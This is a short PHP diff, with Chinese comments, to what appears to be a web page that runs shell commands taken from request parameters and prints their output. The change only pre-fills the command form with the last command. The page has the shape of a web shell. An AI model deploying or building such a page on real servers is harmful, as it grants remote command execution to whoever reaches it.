@@ -21,10 +21,10 @@ if($_REQUEST['do']){
         // 检查返回值以确定命令是否成功执行
         if ($returnValue === 0) {
             // 输出正确的结果
-            echo cmdform().nl2br("Command executed successfully.\n\nOutput:\n".implode("\n", $output)."\n");
+            echo cmdform($cmd).nl2br("Command executed successfully.\n\nOutput:\n".implode("\n", $output)."\n");
         } else {
             // 输出错误信息
-            echo cmdform().nl2br("Command failed to execute.\n\nError:\n".implode("\n", $output)."\n");
+            echo cmdform($cmd).nl2br("Command failed to execute.\n\nError:\n".implode("\n", $output)."\n");
         }
     }
 
